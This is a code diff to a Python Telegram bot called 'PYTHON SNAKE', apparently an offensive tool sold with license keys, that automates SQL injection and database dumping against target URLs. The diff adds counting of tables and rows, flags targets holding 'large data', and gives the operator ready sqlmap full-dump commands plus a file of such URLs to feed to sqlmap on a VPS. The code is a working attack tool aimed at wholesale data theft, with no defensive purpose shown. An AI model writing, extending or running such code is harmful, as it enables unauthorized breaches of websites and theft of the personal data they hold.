@@ -67,7 +67,7 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.9.5"
+VERSION = "v2.9.6"
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -8198,7 +8198,8 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
     t0 = time.time()
     res = {"url": raw, "param": param, "ok": False, "status": "", "dbms": "", "tech": "",
            "quote": "", "comment": "", "db": "", "dbs": [], "tables": {},
-           "notes": [], "rows": 0, "requests": 0, "took": 0, "why": ""}
+           "notes": [], "rows": 0, "requests": 0, "took": 0, "why": "",
+           "large": False, "large_reason": "", "poc": "", "tables_total": 0}
     budget = {"left": int(caps.get("requests", 500)), "used": 0}
     max_tables = int(caps.get("tables", 8))
     max_rows = int(caps.get("rows", 8))
@@ -8276,9 +8277,16 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
 
     if on_stage:
         await on_stage("tables", "listing tables")
-    tbls = _sqli_split(await value(sqli_sql(dbms, "tables"),
-                                    800 if pos else int(caps.get("blind_tables_len", 60))))
-    tbls = [t for t in tbls if t and not t.startswith("sqlite_")][:max_tables]
+    all_tbls = [t for t in _sqli_split(
+        await value(sqli_sql(dbms, "tables"),
+                    800 if pos else int(caps.get("blind_tables_len", 60))))
+        if t and not t.startswith("sqlite_")]
+    res["tables_total"] = len(all_tbls)
+    tbls = all_tbls[:max_tables]
+    if len(all_tbls) > max_tables:
+        res["large"] = True
+        res["large_reason"] = res["large_reason"] or (
+            "%d tables found (inline cap %d)" % (len(all_tbls), max_tables))
     if not tbls:
         res["notes"].append("table list empty (no rights / WAF / no output)")
 
@@ -8290,11 +8298,28 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
             await on_stage("columns", tbl)
         colnames = _sqli_split(await value(sqli_sql(dbms, "columns", table=tbl),
                                            600 if pos else int(caps.get("blind_cols_len", 80))))[:40]
-        entry = {"cols": colnames, "rows": [], "truncated": False}
+        entry = {"cols": colnames, "rows": [], "truncated": False, "total_rows": None,
+                 "skipped": False}
         res["tables"][tbl] = entry
         if not colnames:
             res["notes"].append("%s: columns not readable" % tbl)
             continue
+        # kitni rows hain? (sirf tab jab page output deta ho — 1 request)
+        if pos and cols and budget["left"] > 6:
+            cnt_txt = await value(sqli_sql(dbms, "count", table=tbl), 20)
+            mcnt = re.search(r"\d+", str(cnt_txt or ""))
+            if mcnt:
+                entry["total_rows"] = int(mcnt.group(0))
+                if entry["total_rows"] > max_rows:
+                    entry["skipped"] = True
+                    res["large"] = True
+                    res["large_reason"] = res["large_reason"] or (
+                        "%s has %s rows (inline cap %d)"
+                        % (tbl, fmt(entry["total_rows"]), max_rows))
+                    res["notes"].append(
+                        "%s: %s rows — row dump skipped (data too large for inline dump)"
+                        % (tbl, fmt(entry["total_rows"])))
+                    continue
         limit = max_rows if pos else int(caps.get("blind_rows", 0) or 0)
         for k in range(limit):
             if budget["left"] <= 4:
@@ -8312,6 +8337,17 @@ async def sqli_dump_one(session, raw: str, param: str = "", caps=None,
             res["rows"] += 1
         if pos and len(entry["rows"]) >= max_rows:
             entry["truncated"] = True
+            res["large"] = True
+            res["large_reason"] = res["large_reason"] or (
+                "%s hit the row cap (%d)" % (tbl, max_rows))
+    if budget["left"] <= 0:
+        res["large"] = True
+        res["large_reason"] = res["large_reason"] or "request budget finished before the end"
+    if res["large"]:
+        res["poc"] = raw          # saaf URL — sqlmap khud param test karega
+        res["notes"].append(
+            "LARGE DATA: this URL holds more data than the inline cap — "
+            "use a dedicated dumper (sqlmap) on the VPS with this URL")
     res["requests"] = budget["used"]
     res["took"] = time.time() - t0
     return res
@@ -8328,6 +8364,13 @@ def sqli_report_text(res: dict) -> list:
           "REQ    : %s    TIME: %.1fs" % (res.get("requests", 0), res.get("took", 0))]
     if res.get("why"):
         L_.append("NOTE   : " + str(res["why"]))
+    if res.get("large"):
+        L_.append("-" * 64)
+        L_.append("!! LARGE DATA FOUND — %s" % (res.get("large_reason") or "above inline caps"))
+        L_.append("!! Inline dump is only a preview. Full dump needs a powerful tool.")
+        L_.append("!! Target URL : " + str(res.get("poc") or res.get("url")))
+        L_.append('!! Ready command (VPS): sqlmap -u "%s" -p %s --batch --dump --threads 4'
+                  % (res.get("poc") or res.get("url"), res.get("param") or "id"))
     if res.get("dbs"):
         L_.append("-" * 64)
         L_.append("DATABASES (%d): %s" % (len(res["dbs"]), ", ".join(res["dbs"][:40])))
@@ -8340,7 +8383,10 @@ def sqli_report_text(res: dict) -> list:
             L_.append("  " + " | ".join(str(x)[:80] for x in row))
         if entry.get("truncated"):
             L_.append("  ... limit reached (use /batch dumprows to raise)")
-        if not entry.get("rows"):
+        if entry.get("skipped"):
+            L_.append("  (skipped — %s rows, too large for inline dump)"
+                      % fmt(entry.get("total_rows") or 0))
+        elif not entry.get("rows"):
             L_.append("  (no rows extracted)")
     if res.get("notes"):
         L_.append("-" * 64)
@@ -8754,6 +8800,14 @@ def _dump_progress_card(st: dict, spin: int) -> str:
 
 def _dump_status_line(res: dict) -> str:
     host = urlparse(res.get("url") or "").netloc or res.get("url") or "-"
+    if res.get("ok") and res.get("large"):
+        return ("⚠️ <b>%s</b> — <b>LARGE DATA FOUND</b>\n"
+                "   <i>%s · param <code>%s</code> · %d tables · preview %d rows</i>\n"
+                "   <i>%s</i>\n   <code>%s</code>") % (
+            esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("param") or "-"),
+            res.get("tables_total") or len(res.get("tables") or {}), res.get("rows", 0),
+            esc(res.get("large_reason") or "more data than the inline cap")[:90],
+            esc((res.get("poc") or res.get("url") or "")[:180]))
     if res.get("ok"):
         return "✅ <b>%s</b>\n   <i>%s · %s · param <code>%s</code> · %d tables · %d rows</i>" % (
             esc(host[:44]), esc(res.get("dbms") or "-"), esc(res.get("tech") or "-"),
@@ -8790,6 +8844,7 @@ async def _run_sqldump(update, context, urls, targets=None):
     saved = sqli_save(st)
     results = st["results"]
     okn = st["injectable"]
+    large = [r for r in results if r.get("ok") and r.get("large")]
     head = ("🎯 <b>%d of %d URL(s) injectable</b>" % (okn, len(results))) if okn else \
         "🛡 <b>No injectable URL found</b>"
     card = (H("SQL DUMP COMPLETE", "%.1fs" % st.get("took", 0)) + "\n\n"
@@ -8797,10 +8852,19 @@ async def _run_sqldump(update, context, urls, targets=None):
             + "❖ Tables  : <code>%s</code>\n" % fmt(st["tables"])
             + "❖ Rows    : <code>%s</code>\n" % fmt(st["rows"])
             + "❖ Files   : <code>%s</code>\n" % fmt(len(saved["files"]))
+            + ("⚠️ Large data: <code>%s</code> URL(s) — use a powerful tool\n" % fmt(len(large))
+               if large else "")
             + ("⛔ Stopped early\n" if st.get("stopped") else "")
             + "\n" + bar3(100, 12, None) + "\n\n" + B("Results"))
     for res in results[:6]:
         card += "\n" + _dump_status_line(res) + "\n"
+    if large:
+        card += ("\n" + B("Large data — handover") + "\n"
+                 + P("These URLs hold more than the inline cap. Dump them with a dedicated "
+                     "tool on your VPS:") + "\n"
+                 + "<code>sqlmap -u \"%s\" -p %s --batch --dump --threads 4</code>"
+                 % (esc((large[0].get("poc") or large[0]["url"])[:150]),
+                    esc(large[0].get("param") or "id")) + "\n")
     if len(results) > 6:
         card += "<i>+ %d more in the files…</i>\n" % (len(results) - 6)
     try:
@@ -8816,6 +8880,15 @@ async def _run_sqldump(update, context, urls, targets=None):
         await reply_msg(update).reply_text(
             "📁 Remaining %d report(s) are inside the zip."
             % (len(saved["files"]) - 3), parse_mode=ParseMode.HTML)
+    if large:
+        try:
+            lp = os.path.join(DUMP_DIR, "large_targets_%s.txt" % stamp())
+            with open(lp, "w", encoding="utf-8") as f:
+                for r in large:
+                    f.write("%s\n" % (r.get("poc") or r["url"]))
+            await send_file(update, lp, "⚠️ large-data URLs — feed these to sqlmap")
+        except Exception:
+            pass
     if saved["csv"]:
         await send_file(update, saved["csv"], "📊 all rows (csv)")
     if saved["zip"]:
